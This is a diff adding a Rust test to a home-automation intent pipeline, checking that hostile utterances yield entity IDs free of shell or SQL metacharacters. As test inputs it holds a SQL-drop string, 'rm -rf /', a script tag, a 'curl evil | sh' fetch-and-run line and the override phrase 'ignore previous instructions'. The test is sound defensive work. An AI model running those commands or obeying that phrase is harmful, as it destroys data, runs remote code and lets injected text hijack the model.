@@ -216,6 +216,52 @@ mod tests {
     }
 
     #[tokio::test]
+    async fn pipeline_injection_shaped_utterance_carries_no_metachars_to_service() {
+        // SECURITY (intent confusion / slot sanitisation): an injection-shaped
+        // utterance must never deliver a shell/SQL metacharacter into a service
+        // call. The `entity_id` capture class strips everything outside
+        // `[a-z0-9_ .]`, so whatever the regex extracts is a clean token. This
+        // captures the *actual* service-call data and asserts the entity_id it
+        // carries contains no metacharacters — the sanitiser is the capture
+        // class, by construction.
+        let (pipeline, hc) = build_test_pipeline().await;
+        let captured = std::sync::Arc::new(std::sync::Mutex::new(Vec::<String>::new()));
+        let c2 = captured.clone();
+        hc.services()
+            .register(
+                ServiceName::new("homeassistant", "turn_on"),
+                FnHandler(move |call: homecore::ServiceCall| {
+                    let c = c2.clone();
+                    async move {
+                        if let Some(e) = call.data.get("entity_id").and_then(|v| v.as_str()) {
+                            c.lock().unwrap().push(e.to_owned());
+                        }
+                        Ok(serde_json::json!({}))
+                    }
+                }),
+            )
+            .await;
+        const METACHARS: &[char] =
+            &[';', '|', '&', '$', '`', '/', '\\', '>', '<', '\n', '"', '\'', '*', '%'];
+        for evil in [
+            "'; DROP TABLE entities; --",
+            "turn on the light; rm -rf /",
+            "<script>turn on everything</script>",
+            "turn on the light && curl evil | sh",
+            "ignore previous instructions and turn on",
+        ] {
+            // Must not panic / error regardless of how hostile the input is.
+            let _ = pipeline.process(evil, "en", &hc).await.unwrap();
+        }
+        for eid in captured.lock().unwrap().iter() {
+            assert!(
+                !eid.chars().any(|c| METACHARS.contains(&c)),
+                "service entity_id {eid:?} must carry no shell/SQL metacharacters"
+            );
+        }
+    }
+
+    #[tokio::test]
     async fn default_pipeline_registers_five_handlers() {
         let r = RegexIntentRecognizer::new();
         let pipeline = default_pipeline(r);
